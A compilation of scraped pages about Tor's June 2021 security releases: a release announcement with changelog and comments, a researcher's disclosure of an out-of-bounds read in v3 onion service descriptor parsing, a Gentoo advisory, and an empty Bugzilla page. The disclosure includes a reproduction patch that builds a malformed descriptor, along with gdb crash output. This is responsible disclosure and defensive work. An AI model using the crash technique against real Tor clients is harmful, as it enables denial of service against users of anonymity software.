=== Content from blog.torproject.org_ac3db619_20250114_204942.html ===

[![Tor Blog](../static/images/logo.png)](../)

* [About](https://www.torproject.org/about/history/)
* [Support](https://support.torproject.org/)
* [Community](https://community.torproject.org/)
* [Forum](https://forum.torproject.org/)
* [Donate](https://donate.torproject.org/)

# New stable security releases: 0.3.5.15, 0.4.4.9, 0.4.5.9, 0.4.6.5

by nickm | June 14, 2021

![](lead.png)

After months of work, we have a new stable release series! If you build Tor from source, you can download the source code for 0.4.6.5 on the [download page](https://www.torproject.org/download/tor/). Packages should be available within the next several weeks, with a new Tor Browser around the end of the week.

Because this release includes security fixes, we are also releasing updates for our other supported releases. You can find their source at [https://dist.torproject.org](https://dist.torproject.org/):

* [0.3.5.15](https://dist.torproject.org/tor-0.3.5.15.tar.gz) [(gpg signature)](https://dist.torproject.org/tor-0.3.5.15.tar.gz.asc) [(ChangeLog)](https://gitweb.torproject.org/tor.git/tree/ChangeLog?h=tor-0.3.5.15)
* [0.4.4.9](https://dist.torproject.org/tor-0.4.4.9.tar.gz) [(gpg signature)](https://dist.torproject.org/tor-0.4.4.9.tar.gz.asc) [(ChangeLog)](https://gitweb.torproject.org/tor.git/tree/ChangeLog?h=tor-0.4.4.9) [Note that 0.4.4.9 hits end-of-life tomorrow; this is the last supported 0.4.4.9 release.]
* [0.4.5.9](https://dist.torproject.org/tor-0.4.5.9.tar.gz) [(gpg signature)](https://dist.torproject.org/tor-0.4.5.9.tar.gz.asc) [(ChangeLog)](https://gitweb.torproject.org/tor.git/tree/ChangeLog?h=tor-0.4.5.9)

Tor 0.4.6.5 is the first stable release in its series. The 0.4.6.x series includes numerous features and bugfixes, including a significant improvement to our circuit timeout algorithm that should improve observed client performance, and a way for relays to report when they are overloaded.

This release also includes security fixes for several security issues, including a denial-of-service attack against onion service clients, and another denial-of-service attack against relays. Everybody should upgrade to one of 0.3.5.15, 0.4.4.9, 0.4.5.9, or 0.4.6.5.

Below are the changes since 0.4.5.8. For a list of changes since 0.4.6.4-rc, see the ChangeLog file.

## Changes in version 0.4.6.5 - 2021-06-14

* Major bugfixes (security):
  + Don't allow relays to spoof RELAY\_END or RELAY\_RESOLVED cell on half-closed streams. Previously, clients failed to validate which hop sent these cells: this would allow a relay on a circuit to end a stream that wasn't actually built with it. Fixes bug [40389](https://bugs.torproject.org/tpo/core/tor/40389); bugfix on 0.3.5.1-alpha. This issue is also tracked as TROVE-2021- 003 and CVE-2021-34548.
* Major bugfixes (security, defense-in-depth):
  + Detect more failure conditions from the OpenSSL RNG code. Previously, we would detect errors from a missing RNG implementation, but not failures from the RNG code itself. Fortunately, it appears those failures do not happen in practice when Tor is using OpenSSL's default RNG implementation. Fixes bug [40390](https://bugs.torproject.org/tpo/core/tor/40390); bugfix on 0.2.8.1-alpha. This issue is also tracked as TROVE-2021-004. Reported by Jann Horn at Google's Project Zero.

Ã‚

* Major bugfixes (security, denial of service):
  + Resist a hashtable-based CPU denial-of-service attack against relays. Previously we used a naive unkeyed hash function to look up circuits in a circuitmux object. An attacker could exploit this to construct circuits with chosen circuit IDs, to create collisions and make the hash table inefficient. Now we use a SipHash construction here instead. Fixes bug [40391](https://bugs.torproject.org/tpo/core/tor/40391); bugfix on 0.2.4.4-alpha. This issue is also tracked as TROVE-2021-005 and CVE-2021-34549. Reported by Jann Horn from Google's Project Zero.
  + Fix an out-of-bounds memory access in v3 onion service descriptor parsing. An attacker could exploit this bug by crafting an onion service descriptor that would crash any client that tried to visit it. Fixes bug [40392](https://bugs.torproject.org/tpo/core/tor/40392); bugfix on 0.3.0.1-alpha. This issue is also tracked as TROVE-2021-006 and CVE-2021-34550. Reported by Sergei Glazunov from Google's Project Zero.
* Major features (control port, onion services):
  + Add controller support for creating version 3 onion services with client authorization. Previously, only v2 onion services could be created with client authorization. Closes ticket [40084](https://bugs.torproject.org/tpo/core/tor/40084). Patch by Neel Chauhan.
* Major features (directory authority):
  + When voting on a relay with a Sybil-like appearance, add the Sybil flag when clearing out the other flags. This lets a relay operator know why their relay hasn't been included in the consensus. Closes ticket [40255](https://bugs.torproject.org/tpo/core/tor/40255). Patch by Neel Chauhan.
* Major features (metrics):
  + Relays now report how overloaded they are in their extrainfo documents. This information is controlled with the OverloadStatistics torrc option, and it will be used to improve decisions about the network's load balancing. Implements proposal 328; closes ticket [40222](https://bugs.torproject.org/tpo/core/tor/40222).
* Major features (relay, denial of service):
  + Add a new DoS subsystem feature to control the rate of client connections for relays. Closes ticket [40253](https://bugs.torproject.org/tpo/core/tor/40253).
* Major features (statistics):
  + Relays now publish statistics about the number of v3 onion services and volume of v3 onion service traffic, in the same manner they already do for v2 onions. Closes ticket [23126](https://bugs.torproject.org/tpo/core/tor/23126).
* Major bugfixes (circuit build timeout):
  + Improve the accuracy of our circuit build timeout calculation for 60%, 70%, and 80% build rates for various guard choices. We now use a maximum likelihood estimator for Pareto parameters of the circuit build time distribution, instead of a "right-censored estimator". This causes clients to ignore circuits that never finish building in their timeout calculations. Previously, clients were counting such unfinished circuits as having the highest possible build time value, when in reality these circuits most likely just contain relays that are offline. We also now wait a bit longer to let circuits complete for measurement purposes, lower the minimum possible effective timeout from 1.5 seconds to 10ms, and increase the resolution of the circuit build time histogram from 50ms bin widths to 10ms bin widths. Additionally, we alter our estimate Xm by taking the maximum of the top 10 most common build time values of the 10ms histogram, and compute Xm as the average of these. Fixes bug [40168](https://bugs.torproject.org/tpo/core/tor/40168); bugfix on 0.2.2.14-alpha.
  + Remove max\_time calculation and associated warning from circuit build timeout 'alpha' parameter estimation, as this is no longer needed by our new estimator from 40168. Fixes bug [34088](https://bugs.torproject.org/tpo/core/tor/34088); bugfix on 0.2.2.9-alpha.
* Major bugfixes (signing key):
  + In the tor-gencert utility, give an informative error message if the passphrase given in `--create-identity-key` is too short. Fixes bug [40189](https://bugs.torproject.org/tpo/core/tor/40189); bugfix on 0.2.0.1-alpha. Patch by Neel Chauhan.
* Minor features (bridge):
  + We now announce the URL to Tor's new bridge status at <https://bridges.torproject.org/> when Tor is configured to run as a bridge relay. Closes ticket [30477](https://bugs.torproject.org/tpo/core/tor/30477).
* Minor features (build system):
  + New "make lsp" command to auto generate the compile\_commands.json file used by the ccls server. The "bear" program is needed for this. Closes ticket [40227](https://bugs.torproject.org/tpo/core/tor/40227).
* Minor features (client):
  + Clients now check whether their streams are attempting to re-enter the Tor network (i.e. to send Tor traffic over Tor), and close them preemptively if they think exit relays will refuse them for this reason. See ticket [2667](https://bugs.torproject.org/tpo/core/tor/2667) for details. Closes ticket [40271](https://bugs.torproject.org/tpo/core/tor/40271).
* Minor features (command line):
  + Add long format name "--torrc-file" equivalent to the existing command-line option "-f". Closes ticket [40324](https://bugs.torproject.org/tpo/core/tor/40324). Patch by Daniel Pinto.
* Minor features (command-line interface):
  + Add build informations to `tor --version` in order to ease reproducible builds. Closes ticket [32102](https://bugs.torproject.org/tpo/core/tor/32102).
  + When parsing command-line flags that take an optional argument, treat the argument as absent if it would start with a '-' character. Arguments in that form are not intelligible for any of our optional-argument flags. Closes ticket [40223](https://bugs.torproject.org/tpo/core/tor/40223).
  + Allow a relay operator to list the ed25519 keys on the command line by adding the `rsa` and `ed25519` arguments to the --list-fingerprint flag to show the respective RSA and ed25519 relay fingerprint. Closes ticket [33632](https://bugs.torproject.org/tpo/core/tor/33632). Patch by Neel Chauhan.
* Minor features (compatibility):
  + Remove an assertion function related to TLS renegotiation. It was used nowhere outside the unit tests, and it was breaking compilation with recent alpha releases of OpenSSL 3.0.0. Closes ticket [40399](https://bugs.torproject.org/tpo/core/tor/40399).
* Minor features (control port, stream handling):
  + Add the stream ID to the event line in the ADDRMAP control event. Closes ticket [40249](https://bugs.torproject.org/tpo/core/tor/40249). Patch by Neel Chauhan.
* Minor features (dormant mode):
  + Add a new 'DormantTimeoutEnabled' option to allow coarse-grained control over whether the client ever becomes dormant from inactivity. Most people won't need this. Closes ticket [40228](https://bugs.torproject.org/tpo/core/tor/40228).
  + Add a new 'DormantTimeoutEnabled' option for coarse-grained control over whether the client can become dormant from inactivity. Most people won't need this. Closes ticket [40228](https://bugs.torproject.org/tpo/core/tor/40228).
* Minor features (geoip data):
  + Update the geoip files to match the IPFire Location Database, as retrieved on 2021/06/10.
* Minor features (logging):
  + Edit heartbeat log messages so that more of them begin with the string "Heartbeat: ". Closes ticket [40322](https://bugs.torproject.org/tpo/core/tor/40322); patch from 'cypherpunks'.
  + Change the DoS subsystem heartbeat line format to be more clear on what has been detected/rejected, and which option is disabled (if any). Closes ticket [40308](https://bugs.torproject.org/tpo/core/tor/40308).
  + In src/core/mainloop/mainloop.c and src/core/mainloop/connection.c, put brackets around IPv6 addresses in log messages. Closes ticket [40232](https://bugs.torproject.org/tpo/core/tor/40232). Patch by Neel Chauhan.
* Minor features (logging, diagnostic):
  + Log decompression failures at a higher severity level, since they can help provide missing context for other warning messages. We rate-limit these messages, to avoid flooding the logs if they begin to occur frequently. Closes ticket [40175](https://bugs.torproject.org/tpo/core/tor/40175).
* Minor features (onion services):
  + Add a warning message when trying to connect to (no longer supported) v2 onion services. Closes ticket [40373](https://bugs.torproject.org/tpo/core/tor/40373).
* Minor features (performance, windows):
  + Use SRWLocks to implement locking on Windows. Replaces the "critical section" locking implementation with the faster SRWLocks, available since Windows Vista. Closes ticket [17927](https://bugs.torproject.org/tpo/core/tor/17927). Patch by Daniel Pinto.
* Minor features (protocol, proxy support, defense in depth):
  + Close HAProxy connections if they somehow manage to send us data before we start reading. Closes another case of ticket [40017](https://bugs.torproject.org/tpo/core/tor/40017).
* Minor features (tests, portability):
  + Port the hs\_build\_address.py test script to work with recent versions of python. Closes ticket [40213](https://bugs.torproject.org/tpo/core/tor/40213). Patch from Samanta Navarro.
* Minor features (vote document):
  + Add a "stats" line to directory authority votes, to report various statistics that authorities compute about the relays. This will help us diagnose the network better. Closes ticket [40314](https://bugs.torproject.org/tpo/core/tor/40314).
* Minor bugfixes (build):
  + The configure script now shows whether or not lzma and zstd have been used, not just if the enable flag was passed in. Fixes bug [40236](https://bugs.torproject.org/tpo/core/tor/40236); bugfix on 0.4.3.1-alpha.
* Minor bugfixes (compatibility):
  + Fix a failure in the test cases when running on the "hppa" architecture, along with a related test that might fail on other architectures in the future. Fixes bug [40274](https://bugs.torproject.org/tpo/core/tor/40274); bugfix on 0.2.5.1-alpha.
* Minor bugfixes (compilation):
  + Fix a compilation warning about unused functions when building with a libc that lacks the GLOB\_ALTDIRFUNC constant. Fixes bug [40354](https://bugs.torproject.org/tpo/core/tor/40354); bugfix on 0.4.5.1-alpha. Patch by Daniel Pinto.
* Minor bugfixes (consensus handling):
  + Avoid a set of bugs that could be caused by inconsistently preferring an out-of-date consensus stored in a stale directory cache over a more recent one stored on disk as the latest consensus. Fixes bug [40375](https://bugs.torproject.org/tpo/core/tor/40375); bugfix on 0.3.1.1-alpha.
* Minor bugfixes (control, sandbox):
  + Allow the control command SAVECONF to succeed when the seccomp sandbox is enabled, and make SAVECONF keep only one backup file to simplify implementation. Previously SAVECONF allowed a large number of backup files, which made it incompatible with the sandbox. Fixes bug [40317](https://bugs.torproject.org/tpo/core/tor/40317); bugfix on 0.2.5.4-alpha. Patch by Daniel Pinto.
* Minor bugfixes (directory authorities, voting):
  + Add a new consensus method (31) to support any future changes that authorities decide to make to the value of bwweightscale or maxunmeasuredbw. Previously, there was a bug that prevented the authorities from parsing these consensus parameters correctly under most circumstances. Fixes bug [19011](https://bugs.torproject.org/tpo/core/tor/19011); bugfix on 0.2.2.10-alpha.
* Minor bugfixes (ipv6):
  + Allow non-SOCKSPorts to disable IPv4, IPv6, and PreferIPv4. Some rare configurations might break, but in this case you can disable NoIPv4Traffic and NoIPv6Traffic as needed. Fixes bug [33607](https://bugs.torproject.org/tpo/core/tor/33607); bugfix on 0.4.1.1-alpha. Patch by Neel Chauhan.
* Minor bugfixes (key generation):
  + Do not require a valid torrc when using the `--keygen` argument to generate a signing key. This allows us to generate keys on systems or users which may not run Tor. Fixes bug [40235](https://bugs.torproject.org/tpo/core/tor/40235); bugfix on 0.2.7.2-alpha. Patch by Neel Chauhan.
* Minor bugfixes (logging, relay):
  + Emit a warning if an Address is found to be internal and tor can't use it. Fixes bug [40290](https://bugs.torproject.org/tpo/core/tor/40290); bugfix on 0.4.5.1-alpha.
* Minor bugfixes (metrics port):
  + Fix a bug that made tor try to re-bind() on an already open MetricsPort every 60 seconds. Fixes bug [40370](https://bugs.torproject.org/tpo/core/tor/40370); bugfix on 0.4.5.1-alpha.
* Minor bugfixes (onion services, logging):
  + Downgrade the severity of a few rendezvous circuit-related warnings from warning to info. Fixes bug [40207](https://bugs.torproject.org/tpo/core/tor/40207); bugfix on 0.3.2.1-alpha. Patch by Neel Chauhan.
* Minor bugfixes (relay):
  + Reduce the compression level for data streaming from HIGH to LOW. This should reduce the CPU and memory burden for directory caches. Fixes bug [40301](https://bugs.torproject.org/tpo/core/tor/40301); bugfix on 0.3.5.1-alpha.
* Minor bugfixes (testing, BSD):
  + Fix pattern-matching errors when patterns expand to invalid paths on BSD systems. Fixes bug [40318](https://bugs.torproject.org/tpo/core/tor/40318); bugfix on 0.4.5.1-alpha. Patch by Daniel Pinto.
* Code simplification and refactoring:
  + Remove the orconn\_ext\_or\_id\_map structure and related functions. (Nothing outside of unit tests used them.) Closes ticket [33383](https://bugs.torproject.org/tpo/core/tor/33383). Patch by Neel Chauhan.
* Removed features:
  + Remove unneeded code for parsing private keys in directory documents. This code was only used for client authentication in v2 onion services, which are now unsupported. Closes ticket [40374](https://bugs.torproject.org/tpo/core/tor/40374).
  + As of this release, Tor no longer supports the old v2 onion services. They were deprecated last July for security, and support will be removed entirely later this year. We strongly encourage everybody to migrate to v3 onion services. For more information, see <https://blog.torproject.org/v2-deprecation-timeline> . Closes ticket [40266](https://bugs.torproject.org/tpo/core/tor/40266). (NOTE: We accidentally released an earlier version of the 0.4.6.1-alpha changelog without this entry. Sorry for the confusion!)
* Code simplification and refactoring (metrics, DoS):
  + Move the DoS subsystem into the subsys manager, including its configuration options. Closes ticket [40261](https://bugs.torproject.org/tpo/core/tor/40261).
* Documentation (manual):
  + Move the ServerTransport\* options to the "SERVER OPTIONS" section. Closes issue [40331](https://bugs.torproject.org/tpo/core/tor/40331).
  + Indicate that the HiddenServiceStatistics option also applies to bridges. Closes ticket [40346](https://bugs.torproject.org/tpo/core/tor/40346).
  + Move the description of BridgeRecordUsageByCountry to the section "STATISTICS OPTIONS". Closes ticket [40323](https://bugs.torproject.org/tpo/core/tor/40323).
* Removed features (relay):
  + Because DirPorts are only used on authorities, relays no longer advertise them. Similarly, self-testing for DirPorts has been disabled, since an unreachable DirPort is no reason for a relay not to advertise itself. (Configuring a DirPort will still work, for now.) Closes ticket [40282](https://bugs.torproject.org/tpo/core/tor/40282).

* [releases](../category/releases)

## Comments

Please note that the comment area below has been archived.

MomsSpaghetti (not verified) said:

June 14, 2021

[Permalink](#comment-291963)

### [Typo alert -> "New stableÃ¢Â€Â¦](#comment-291963)

Typo alert -> "New stable security releases: 0.3.5.15, 0.4.4.9, 0.4.5.9, 0.4.6.9

by nickm | June 14, 2021"

^ there is no 0.4.6.9

Other than that new release 0.4.6.5 builds and runs fine at least with latest Windows/MINGW-W64

nickm

nickm said:

June 14, 2021

In reply to [Typo alert -> "New stableÃ¢Â€Â¦](#comment-291963) by MomsSpaghetti (not verified)

[Permalink](#comment-291967)

### [Thanks! I've edited theÃ¢Â€Â¦](#comment-291967)

Thanks! I've edited the title.

MomsSpaghetti (not verified) said:

June 14, 2021

In reply to nickm

[Permalink](#comment-291969)

### [Always a pleasure to readÃ¢Â€Â¦](#comment-291969)

Always a pleasure to read your responses, you should have left it like that for a while to make all those ad-infested copy-pasted blogs embarrass themselves. I doubt anyone having IT blogs care about the content of their articles. Nowadays if you don't have a list of original sources to visit you are doomed.

Just a question too generic to pollute gitlab with, do you think we could have an official Go library for Tor soon, anyone working on it? At least with basic functionality would save lots of trouble with cross compiling and IoT devices.

nickm

nickm said:

June 16, 2021

In reply to [Always a pleasure to readÃ¢Â€Â¦](#comment-291969) by MomsSpaghetti (not verified)

[Permalink](#comment-291985)

### [Rust is more likely;Ã¢Â€Â¦](#comment-291985)

Rust is more likely; probably some time later this year. If it works out then it shouldn't be too hard for somebody to write Go bindings (I'd hope).

Anonymous (not verified) said:

June 14, 2021

[Permalink](#comment-291964)

### [Packages should be availableÃ¢Â€Â¦](#comment-291964)

> Packages should be available within the next several weeks

May I just ask, how come it needs to take "several weeks" for deb packages to appear for the new tor 0.4.6.9?

nickm

nickm said:

June 14, 2021

In reply to [Packages should be availableÃ¢Â€Â¦](#comment-291964) by Anonymous (not verified)

[Permalink](#comment-291968)

### [It might be sooner. TheÃ¢Â€Â¦](#comment-291968)

It might be sooner. The issue is that since most binary packages are built by volunteers who do not work for Tor, we can't make commitments about how quickly they will be out.

(Many platforms have additional checks that they need to do as they do their releases: for example, making sure that they don't get the version numbers wrong in their announcements. [embarrassed face emoji here])

Anonymous (not verified) said:

June 15, 2021

[Permalink](#comment-291973)

### [> When voting on a relayÃ¢Â€Â¦](#comment-291973)

> When voting on a relay with a Sybil-like appearance, add the Sybil flag when clearing out the other flags. This lets a relay operator know why their relay hasn't been included in the consensus. Closes ticket 40255.

Wouldn't that help operators game the voting criteria?

Anonymous (not verified) said:

June 23, 2021

[Permalink](#comment-292037)

### [Re: bug 40389 Why circ-Ã¢Â€Â¦](#comment-292037)

Re: bug 40389

Why circ->cpath->prev instead of keep&use cpath\_layer?

Why to count as valid injected 'connected','sendme','data' cells?

Anonymous (not verified) said:

June 23, 2021

[Permalink](#comment-292040)

### [Was there some issue with v0Ã¢Â€Â¦](#comment-292040)

Was there some issue with v0.4.6.5 (other than the initial title here) because it still has not appeared on deb.torproject.org?

## Recent Updates

## [New Release: Tails 6.11](/new-release-tails-611/)

by [tails](/author/tails) | January 9, 2025

Tails 6.11 fixes several critical security vulnerabilities that were identified during an external audit.

## [New Release: Tor Browser 14.0.4](/new-release-tor-browser-1404/)

by [morgan](/author/morgan) | January 8, 2025

Tor Browser 14.0.4 is now available from the Tor Browser download page and also from our distribution directory.

## [Arti 1.3.2 is released: onion services, RPC, relay development, and more](/arti_1_3_2_released/)

by [nickm](/author/nickm) | January 7, 2025

Arti 1.3.2 is released and ready for download.

### Download Tor Browser

Download Tor Browser to experience real private browsing without tracking, surveillance, or censorship.

[Download Tor Browser](https://www.torproject.org/download/)

### Subscribe to our Newsletter

Get monthly updates and opportunities from the Tor Project:

[Sign up](https://newsletter.torproject.org/)

####

####

####

####

####

####

####

Trademark, copyright notices, and rules for use by third parties can be found in our [FAQ](https://www.torproject.org/about/trademark/).



=== Content from gitlab.torproject.org_df66606b_20250114_204943.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# TROVE-2021-006: Out-of-bounds read in desc\_decode\_encryted\_v3

Reported by Sergei Glazunov at Google. This issue is confidential.

---

Greetings,

There's an out-of-bounds read issue in desc\_decode\_encrypted\_v3.

Consider the definition of the R3\_INTRO\_AUTH\_REQUIRED token:

```
/** Descriptor ruleset for the encrypted section. */
static token_rule_t hs_desc_encrypted_v3_token_table[] = {
  T1_START(str_create2_formats, R3_CREATE2_FORMATS, CONCAT_ARGS, NO_OBJ),
  T01(str_intro_auth_required, R3_INTRO_AUTH_REQUIRED, ARGS, NO_OBJ),
  T01(str_single_onion, R3_SINGLE_ONION_SERVICE, ARGS, NO_OBJ),
  END_OF_TABLE
};
```

The macro ARGS indicates that the token can have any number of
arguments (including zero). However, the function
desc\_decode\_encrypted\_v3 expects the token to always have an argument
at index 0:

```
/** Decode the version 3 encrypted section of the given descriptor desc. The
 * desc_encrypted_out will be populated with the decoded data. */
static hs_desc_decode_status_t
desc_decode_encrypted_v3(const hs_descriptor_t *desc,
                         const curve25519_secret_key_t *client_auth_sk,
                         hs_desc_encrypted_data_t *desc_encrypted_out)
{
[...]
  /* Authentication type. It's optional but only once. */
  tok = find_opt_by_keyword(tokens, R3_INTRO_AUTH_REQUIRED);
  if (tok) {
    if (!decode_auth_type(desc_encrypted_out, tok->args[0])) {
      log_warn(LD_REND, "Service descriptor authentication type has "
                        "invalid entry(ies).");
      goto err;
    }
  }
```

As a result, the function may access an out-of-bounds char pointer,
which is then passed to decode\_auth\_type.

The easiest way to reproduce the issue is to apply the following patch
and run one of the hs\_descriptor unit tests. Iâ€™ve also confirmed that
a malicious hidden service can crash clients that are trying to
connect to it on a testnet.

```
diff --git a/src/feature/hs/hs_descriptor.c b/src/feature/hs/hs_descriptor.c
index 0656224e48..0e241a1d1a 100644
--- a/src/feature/hs/hs_descriptor.c
+++ b/src/feature/hs/hs_descriptor.c
@@ -754,14 +754,7 @@ get_inner_encrypted_layer_plaintext(const
hs_descriptor_t *desc)
     smartlist_add_asprintf(lines, "%s %d\n", str_create2_formats,
                            ONION_HANDSHAKE_TYPE_NTOR);

-    if (desc->encrypted_data.intro_auth_types &&
-        smartlist_len(desc->encrypted_data.intro_auth_types)) {
-      /* Put the authentication-required line. */
-      char *buf = smartlist_join_strings(desc->encrypted_data.intro_auth_types,
-                                         " ", 0, NULL);
-      smartlist_add_asprintf(lines, "%s %s\n", str_intro_auth_required, buf);
-      tor_free(buf);
-    }
+    smartlist_add_asprintf(lines, "%s\n", str_intro_auth_required);

     if (desc->encrypted_data.single_onion_service) {
       smartlist_add_asprintf(lines, "%s\n", str_single_onion);
@@ -827,6 +820,15 @@ get_outer_encrypted_layer_plaintext(const
hs_descriptor_t *desc,
     smartlist_add(lines, auth_client_lines);
   }

+
+  char tmp[4001];
+  memset(tmp, 'B', 4000);
+  tmp[4000] = 0;
+
+  for (int i = 0; i < 5; ++i)
+    smartlist_add_asprintf(lines,
+                             "opt %s\n", tmp);
+
   /* create encrypted section */
   {
     smartlist_add_asprintf(lines,
@@ -2673,18 +2675,6 @@ hs_desc_encode_descriptor,(const hs_descriptor_t *desc,
     goto err;
   }

-  /* Try to decode what we just encoded. Symmetry is nice!, but it is
-   * symmetric only if the client auth is disabled. That is, the descriptor
-   * cookie will be NULL. */
-  if (!descriptor_cookie) {
-    ret = hs_desc_decode_descriptor(*encoded_out, &desc->subcredential,
-                                    NULL, NULL);
-    if (BUG(ret != HS_DESC_DECODE_OK)) {
-      ret = -1;
-      goto err;
-    }
-  }
-
   return 0;

  err:
```

gdb output:

```
gdb --args ./src/test/test --no-fork hs_descriptor/decode_descriptor
[...]
Program received signal SIGSEGV, Segmentation fault.
__strchr_sse2 () at ../sysdeps/x86_64/multiarch/../strchr.S:32
32  ../sysdeps/x86_64/multiarch/../strchr.S: No such file or directory.
(gdb) x/i $pc
=> 0x7ffff77b8617 <__strchr_sse2+39>: movdqu xmm0,XMMWORD PTR [rdi]
(gdb) info reg
rax            0x242               578
rbx            0x0                 0
rcx            0x0                 0
rdx            0x0                 0
rsi            0x20                32
rdi            0x4242424242424242  4774451407313060418
rbp            0x7fffffffd9d0      0x7fffffffd9d0
rsp            0x7fffffffd958      0x7fffffffd958
r8             0x0                 0
r9             0x0                 0
r10            0x7ffff78a2ac0      140737346415296
r11            0x7ffff78a33c0      140737346417600
r12            0x0                 0
r13            0x2919ce            2693582
r14            0x3ba8e0            3909856
r15            0x4242424242424242  4774451407313060418
rip            0x7ffff77b8617      0x7ffff77b8617 <__strchr_sse2+39>
[...]
(gdb) bt
#0  __strchr_sse2 () at ../sysdeps/x86_64/multiarch/../strchr.S:32
#1  0x0000000000bc08f7 in smartlist_split_string (sl=0x1789e60,
str=<optimized out>, sep=<optimized out>, flags=<optimized out>,
max=<optimized out>)
    at src/lib/smartlist_core/smartlist_split.c:55
#2  0x00000000009c5dc4 in decode_auth_type (desc=0x17854c0,
list=0x4242424242424242 <error: Cannot access memory at address
0x4242424242424242>)
    at src/feature/hs/hs_descriptor.c:1216
#3  desc_decode_encrypted_v3 (desc=0x1785420,
client_auth_sk=<optimized out>, desc_encrypted_out=<optimized out>) at
src/feature/hs/hs_descriptor.c:2327
#4  0x00000000009c3c32 in hs_desc_decode_encrypted (desc=0x1785420,
client_auth_sk=<optimized out>, desc_encrypted=<optimized out>)
    at src/feature/hs/hs_descriptor.c:2421
#5  0x00000000009c4447 in hs_desc_decode_descriptor (
    encoded=0x17a7dd0 "hs-descriptor 3\ndescriptor-lifetime
180\ndescriptor-signing-key-cert\n-----BEGIN ED25519 CERT-----\n"...,
subcredential=<optimized out>, client_auth_sk=<optimized out>,
desc_out=<optimized out>)
    at src/feature/hs/hs_descriptor.c:2604
#6  0x000000000070cc44 in test_decode_descriptor (arg=<optimized out>)
at src/test/test_hs_descriptor.c:266
#7  0x00000000008e98c7 in testcase_run_bare_ (testcase=0xbf27b8
<hs_descriptor+120>) at src/ext/tinytest.c:107
#8  testcase_run_one (group=<optimized out>, testcase=0xbf27b8
<hs_descriptor+120>) at src/ext/tinytest.c:272
#9  0x00000000008ea4e2 in tinytest_main (c=<optimized out>,
v=<optimized out>, groups=<optimized out>) at src/ext/tinytest.c:454
#10 0x00000000008e8aa1 in main (c=3, v=<optimized out>) at
src/test/testing_common.c:420
```

The out-of-bounds pointer value can be controlled, but itâ€™s extremely
unlikely the issue can be used for anything other than a very limited
info leak.

The issue is reported with no disclosure deadline.

Cheers
Sergei

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from security.gentoo.org_49c0e1a8_20250114_204943.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Tor: Multiple vulnerabilities â€” GLSA **202107-25**

Multiple vulnerabilities have been found in Tor, the worst of which
could result in a Denial of Service condition.

### Affected packages

| Package | **net-vpn/tor** on all architectures |
| --- | --- |
| Affected versions | < **0.4.6.5** |
| Unaffected versions | >= **0.4.6.5**>= **0.4.5.9**>= **0.4.4.9** |

### Background

Tor is an implementation of second generation Onion Routing, a
connection-oriented anonymizing communication service.

### Description

Multiple vulnerabilities have been discovered in Tor. Please review the
CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All Tor 0.4.6.x users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-vpn/tor-0.4.6.5"

```

All Tor 0.4.5.x users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-vpn/tor-0.4.5.9"

```

All Tor 0.4.4.x users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-vpn/tor-0.4.4.9"

```
### References

* [CVE-2021-28089](https://nvd.nist.gov/vuln/detail/CVE-2021-28089)
* [CVE-2021-28090](https://nvd.nist.gov/vuln/detail/CVE-2021-28090)
* [CVE-2021-34548](https://nvd.nist.gov/vuln/detail/CVE-2021-34548)
* [CVE-2021-34549](https://nvd.nist.gov/vuln/detail/CVE-2021-34549)
* [CVE-2021-34550](https://nvd.nist.gov/vuln/detail/CVE-2021-34550)

**Release date**

July 10, 2021

**Latest revision**

July 10, 2021: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [776586](https://bugs.gentoo.org/show_bug.cgi?id=776586)
* [795969](https://bugs.gentoo.org/show_bug.cgi?id=795969)

### Questions or comments?

Please feel free to contact us.

**Â© 2001â€“2020 Gentoo Foundation, Inc.**



=== Content from bugs.gentoo.org_632f498e_20250115_183626.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla â€“ BugÂ 77658
Naim causes freezing in Gentoo
Last modified: 2005-01-25 10:46:45 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)â€“[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [NewÂ Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=77658&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=77658&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

